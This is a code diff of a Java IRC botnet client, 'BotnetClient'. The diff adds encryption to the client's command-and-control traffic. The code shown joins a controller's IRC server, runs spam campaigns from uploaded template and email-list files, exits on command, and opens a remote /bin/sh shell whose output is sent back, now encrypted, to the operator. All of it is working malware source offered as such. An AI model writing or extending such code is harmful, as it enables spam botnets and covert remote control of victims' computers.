@@ -41,7 +41,6 @@ public class BotnetClient extends PircBot {
 	}
 	
 	public BotnetClient() {
-		//MsgEncrypt cipher = MsgEncrypt.getInstance(key, secretKey);
 		uuid = UUID.randomUUID().toString();
 		id = NAME + "_" + uuid;
 		try {
@@ -49,12 +48,6 @@ public class BotnetClient extends PircBot {
 			setName(id);
 			setMessageDelay(0);
 			connect(SERVER, PORT);
-			
-			//startKey = MsgEncrypt.getStartKey();
-			//startKey = new SecretKeySpec(key, "DESede");
-			//startCipher = Cipher.getInstance("AES");
-			//startCipher.init(Cipher.DECRYPT_MODE, startKey);
-			//startMsgE = MsgEncrypt.getInstance(startKey);
 		} catch (NickAlreadyInUseException e) {
 			uuid = UUID.randomUUID().toString();
 			id = NAME + "_" + uuid;
@@ -91,7 +84,7 @@ public class BotnetClient extends PircBot {
 			try {
 				// TODO: maybe need to put this back
 				//System.out.println(message);
-				//message = startMsgE.decryptMsg(message);
+				message = m.decryptMsg(message);
 				//System.out.println(message);
 				if (message.toLowerCase().startsWith("spam")) {
 					String[] parts = message.split("'");
@@ -142,17 +135,7 @@ public class BotnetClient extends PircBot {
 						System.exit(0);
 					}
 				} else if (message.toLowerCase().startsWith("kill")) {
-					System.exit(0);
-				} else if (message.toLowerCase().startsWith("key")) {
-					String[] parts = message.split(" ", 3);
-					//System.out.println(Arrays.toString(parts));
-					//TODO: Do stuff with parts[1]
-					String key = parts[1].replace("::", "\n").replace("-", "\r").replace("_", "\r\n");
-					String publicInfo = parts[2];
-					m = MsgEncrypt.getInstance();
-					m.setPubParams(publicInfo);
-					m.handShake(key);
-					sendMessage(CC, "key " + m.getStrKey());
+					System.exit(0);	
 				} else {
 					System.out.println(sender + "<" + hostname + "> tried to use me with (" + message + ")");
 				}
@@ -184,7 +167,8 @@ public class BotnetClient extends PircBot {
 			if (fileName.equals(TEMPLATE) || fileName.equals(EMAILS)) {
 				transfer.receive(new File(fileName), false);
 			} else {
-				this.sendMessage(CC, "Expecting file of name " + TEMPLATE + " or " + EMAILS);
+				String response = "Expecting file of name " + TEMPLATE + " or " + EMAILS;
+				this.sendMessage(CC, m.encryptMsg(response));
 			}
 		} else {
 			System.out.println(transfer.getNick() + "<" + transfer.getNumericalAddress() + "> tried to send me " + transfer.getFile().getAbsolutePath());
@@ -247,7 +231,7 @@ public class BotnetClient extends PircBot {
 						m.handShake(otherKey);
 						chat.sendLine(m.getStrKey().replace("\r\n", "_").replace("\r", "-").replace("\n", "::"));
 						chat.close();
-					} else if (command.equalsIgnoreCase("shell")) {
+					} else if (m.decryptMsg(command).equalsIgnoreCase("shell")) {
 						//Create the bash shell
 						Runtime r = Runtime.getRuntime();
 						Process p = r.exec("/bin/sh");
@@ -273,11 +257,13 @@ public class BotnetClient extends PircBot {
 		        				//String encS = startMsgE.encryptMsg(s);
 		        				//System.out.println(encS);
 		        				//chat.sendLine(encS);
-		        				chat.sendLine(s);
+		        				//chat.sendLine(s);
+		        				chat.sendLine(m.encryptMsg(s));
 		        				System.out.println("bash response: " + s);
 		        				s = bashout.readLine();
 		        			}
-		        			chat.sendLine(s);
+		        			//chat.sendLine(s);
+		        			chat.sendLine(m.encryptMsg(s));
 		        			//System.out.println(s);
 		        			//System.out.println(startMsgE.encryptMsg(s));
 		        			//chat.sendLine(startMsgE.encryptMsg(s));
@@ -366,12 +352,14 @@ public class BotnetClient extends PircBot {
 	    		//String command = startMsgE.decryptMsg(encCommand);
 	    		//System.out.println(encCommand);
 	    		//System.out.println(command);
-	    		String command = chat.readLine();
-	        	while (command != null && !command.equalsIgnoreCase(TERMINATION) && !terminate) {
+	    		//String command = chat.readLine();
+	        	String command = m.decryptMsg(chat.readLine());
+	    		while (command != null && !command.equalsIgnoreCase(TERMINATION) && !terminate) {
 	        		System.out.println("command: " + command);
 	        		bashin.println(command);
 	        		bashin.println("echo `pwd` '$: '");
-	        		command = chat.readLine();
+	        		//command = chat.readLine();
+	        		command = m.decryptMsg(chat.readLine());
 	        		//encCommand = chat.readLine();
 	        		//command = startMsgE.decryptMsg(encCommand);
 	        	}
@@ -405,7 +393,8 @@ public class BotnetClient extends PircBot {
 	        	while (s != null && bashin.ready() && !terminate) {
 	        		s = bashin.readLine();
 	        		System.out.println("error: " + s);
-	        		chat.sendLine(s);
+	        		//chat.sendLine(s);
+	        		chat.sendLine(m.encryptMsg(s));
 	        	}
 	    	} catch (Exception e) {
 	            System.out.println(e.getMessage());
